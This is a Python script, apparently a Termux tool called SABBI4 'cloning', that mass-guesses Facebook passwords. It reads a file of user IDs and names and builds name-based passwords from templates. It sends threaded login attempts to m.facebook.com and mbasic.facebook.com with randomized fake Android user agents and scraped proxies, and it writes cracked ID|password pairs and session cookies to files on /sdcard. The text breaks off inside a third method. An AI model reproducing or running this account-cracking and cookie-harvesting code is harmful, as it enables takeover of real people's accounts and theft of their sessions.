# create by SABBI4.X

from os import path
import os,base64,zlib,pip,urllib
import os
try:
    import requests
except ImportError:
    dek('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    dek('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    dek('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
urlinfb=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
ugen=[]
ugen=[]
useragent=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	useragent.append(uakua)
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 dek('')

def tln():
        dek(40*'=')
def clear():
        os.system(f'clear')
        dek(logo)
loop=0
oks=[]
cps=[]
hdcp=[]
id=[]
tokenku=[]
sexxe=[]
pak=('pak')

ahsan="A1B2C3"
imt="3X0V7SY5S"
ak="SABBI4_X2"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.SABBI4-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.SABBI4-cov', 'w')
	kok.write(myid+imt)
	kok.close()

##########l
dek=print

##############@######2############2#2#
logo = (f"""\t\033[38;5;46m╔══════════════════════════════════╗
\t\033[38;5;46m║\033[38;5;46mSA    SA \33[38;5;196mSABBI4 \033[34;1mSA    SA  \033[38;5;46mSABBI4SA    ║\33[38;5;196m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA   SA   \33[38;5;196mSA  \033[34;1mSA#   SA \033[38;5;46mSA    SA   ║\033[38;5;46m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA  SA    \33[38;5;196mSA  \033[34;1mSABBI4  SA \033[38;5;46mSA         ║\33[38;5;196m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSABBI4#     \33[38;5;196mSA  \033[34;1mSA SA SA \033[38;5;46mSA   SABBI4  ║\033[38;5;46m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA  SA    \33[38;5;196mSA  \033[34;1mSA  SABBI4 \033[38;5;46mSA    SA   ║\33[38;5;196m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA   SA   \33[38;5;196mSA  \033[34;1mSA   SA# \033[38;5;46mSA    SA   ║\033[38;5;46m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m║\033[38;5;46mSA    SA \33[38;5;196mSABBI4 \033[34;1mSA    SA  \033[38;5;46mSABBI4SA    ║\33[38;5;196m✮⃝SABBI4𝄟⃝
\t\033[38;5;46m╚══════════════════════════════════╝
               \033[34;1m𝗪𝗜𝗙𝗜 𝗪𝗢𝗥SABBI4 𝗧𝗢𝗢𝗟𝗦💥💥
\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mSABBI4\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┓
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]SABBI4\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]SABBI4\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : [★]SABBI4-𝗧𝗘𝗥𝗠𝗨𝗫\33[38;5;196m       ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m        ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+𝟴𝟴𝟬𝟭304683013\33[38;5;196m     ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\33[38;5;196m  : [★]𝗥𝟰𝗡𝗗𝗢𝗠-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\33[38;5;196m     ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]𝗩A4SON-1.1\33[38;5;196m         ┃
 \33[38;5;196m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31mSABBI4\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""")
#####*#*#####**#######
#####
def Main():
	os.system('clear')
	dek (logo)
	dek(f"  [\x1b[1;92m1\x1b[1;97m] FILE CLONING")
	dek(f"  [\x1b[1;92m2\x1b[1;97m] RANDOM CLONING")
	dek(f"  [\x1b[1;91m3\x1b[1;97m] Exit")
	dek(40*"=")
	me=input(f'  [\x1b[1;96m+\x1b[1;97m] Choice : ')
	if me in ["2", "02","22","2","b"]:
		xxggx()
	if me in ["1", "01","11","1","a"]:
		xxgg()
#################=============_####
def xxgg():
		os.system('clear')
		dek(logo)
		file = input(f'  [!] PUT FILE PATH\033[1;37m : ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			dek(f'  [!] FILE LOCATION NOT FOUND ')
			exit()
		os.system('clear')
		dek(logo);dek(f'  [\x1b[1;96m+\x1b[1;97m] Do you went show cookie?(y/n) ')
		dek(40*"=")
		mthd=input(f'  [\x1b[1;96m+\x1b[1;97m] Choose: ')
		plist=[]
		try:
			os.system('clear')
			dek (logo)
			dek('\t\t4 BEST')
			dek (40*"=")
			ps_limit = int(input(f'  How many passwords do you want to add ? '))
		except:
			ps_limit =1
		os.system('clear')
		dek (logo)
		dek('  EXAMPLE : first123,last123,firstlast, first last')
		dek (40*"=")
		for i in range(ps_limit):
			plist.append(input(f'  [{i+1}] password : '))
		os.system('clear')
		dek (logo)
		dek(f'  [\x1b[1;96m+\x1b[1;97m] Do you went show cp account? (y/n): ')
		tln()
		cx=input(f'  [\x1b[1;96m+\x1b[1;97m] CHOOSE: ')
		if cx in ['n','N','no','NO','2']:
			hdcp.append(f'n')
		else:
			hdcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			os.system('clear')
			dek (logo)
			total_ids = str(len(fo))
			dek(f'  TOTAL ID : \033[1;32m'+total_ids+f' \n\033[1;37m  THE PROCESS HAS BEEN STARTED  \n  USE AEROPLANE MOOD IN EVERY 5 MIN \n{40*"="}  ')
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ["1", "01","12","N","n"]:
					crack_submit.submit(method1,ids,names,passlist)
				elif mthd in ["2", "02","22","Y","y"]:
					crack_submit.submit(method2,ids,names,passlist)
				else:
					crack_submit.submit(api1,ids,names,passlist)

#__________auto


#==================method1=====°°°°°==========
def method1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mSABBI4\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = '445566'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        useragentxxx=random.choice(ugen)
                        head = {'Host': 'm.facebook.com',
                        'method': 'GET',
                        'path':'/',
                        'scheme': 'https',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
                        'cache-control': 'max-age=0',
                        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-platform': '"Android"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        "User-Agent": useragentxxx,}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        SABBI4=session.cookies.get_dict().keys()
                        if "c_user" in SABBI4:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                dek(f'\r\r\033[1;35m [\033[1;37mSABBI4-OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas))
                                open('/sdcard/SABBI4-file-OK.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/SABBI4-file-COKI.txt','a').write(kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SABBI4:
                                if 'y' in hdcp:
                                        dek(f'\r\r\033[1;35m [\033[1;37mSABBI4-CP\033[1;35m]\x1b[1;91m '+ids+' \033[1;37m| \x1b[1;91m'+pas+'\033[1;97m')
                                        open('/sdcard/SABBI4-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
#==================method2=====°°°°°==========
def method2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mSABBI4-M1\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = '445566'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        useragentxxx=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com',
                        'method': 'GET',
                        'path':'/',
                        'scheme': 'https',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
                        'cache-control': 'max-age=0',
                        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-platform': '"Android"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        "User-Agent": useragentxxx,}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        SABBI4=session.cookies.get_dict().keys()
                        if "c_user" in SABBI4:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                dek(f'\r\r\033[1;35m [\033[1;37mSABBI4-OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas));dek("\033[1;37m [\033[1;36mCOOKIES🍪\033[1;37m] : \33[1;92m"+kuki+"")
                                open('/sdcard/SABBI4-file-OK.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/SABBI4-FILE-COKI','a').write(kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SABBI4:
                                if 'y' in hdcp:
                                        dek(f'\r\r\033[1;35m [\033[1;37mSABBI4-CP\033[1;35m]\x1b[1;90m '+ids+' \033[1;37m| \x1b[1;90m'+pas+'\033[1;97m')
                                        open('/sdcard/SABBI4-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#==================method3=====°°°°°==========
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mSABBI4-M1\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(urlinfb)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
